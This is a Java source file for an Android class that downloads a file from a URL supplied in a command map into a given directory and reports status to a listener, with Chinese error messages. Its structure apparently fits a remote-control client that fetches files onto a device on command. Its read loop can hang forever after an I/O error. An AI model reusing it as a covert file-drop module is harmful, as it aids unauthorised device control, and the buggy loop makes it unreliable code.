package com.android.security.library;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;

import com.android.security.ClientListener;
import com.android.security.MainService;

import android.util.Log;

public class UrlDownloader {
	private String saveDir;
	private ClientListener ctx;
	private URL url;
	private String urlString;
	
	private String TAG = this.getClass().getSimpleName();

	public UrlDownloader(ClientListener service) {
		this.ctx = service;
	}

	public void StartDownload(Map<String, String> information) {
		urlString = (String) information.get("url");
		saveDir = (String) information.get("dir");
		try {
			url = new URL(urlString);
			new Thread(new Runnable() {
				public void run() {
					UrlDownloader.this.DownloadFile();
				}
			}).start();

		} catch (MalformedURLException e) {
			ctx.sendError("无效的URL链接");
			return;
		}

	}

	public void DownloadFile() {
		HttpURLConnection connection = null;
		InputStream inStream = null;
		FileOutputStream outputFile = null;
		String fileName = urlString.substring((urlString.lastIndexOf("/") + 1));
		File dir = new File(saveDir);


		if (!dir.exists()) {
			Log.i(TAG, "1:"+dir.getAbsolutePath());
			if (!dir.mkdirs()) {
				ctx.sendError("创建文件夹错误");
				return;
			}
		}
		if (!saveDir.endsWith("/")) {
			saveDir += "/";
		}
		Log.i(TAG, "saveDir:"+saveDir+fileName);
		File file = new File(saveDir+fileName);
		try {
			file.createNewFile();
		} catch (IOException e) {
			e.printStackTrace();
			ctx.sendError("创建文件错误");
			return;
		}
		try {
			connection = (HttpURLConnection) url.openConnection();
			connection.setConnectTimeout(0x1388);
			connection.setReadTimeout(0x2710);
			inStream = connection.getInputStream();
		} catch (IOException e) {
			ctx.sendError("创建连接错误");
			return;
		}
		try {
			outputFile = new FileOutputStream(file);
		} catch (FileNotFoundException e) {
			try {
				inStream.close();
			} catch (IOException localIOException1) {
			}
			ctx.sendError("写文件错误");
			return;
		}
		byte[] buffer = new byte[0x400];
		int readSize = -1;

		while (true) {

			try {
				readSize = inStream.read(buffer, 0, buffer.length);
				if (readSize > 0) {
					outputFile.write(buffer, 0, readSize);
				} else {
					break;
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				try {
					inStream.close();
					outputFile.close();
				} catch (IOException localIOException2) {
					ctx.sendError("URL 下载错误");
				}
			}
		}
		try {
			connection.disconnect();
			outputFile.flush();
			outputFile.close();
			inStream.close();
		} catch (IOException localIOException3) {
		}

		ctx.sendInformation("文件下载完成");

	}
}
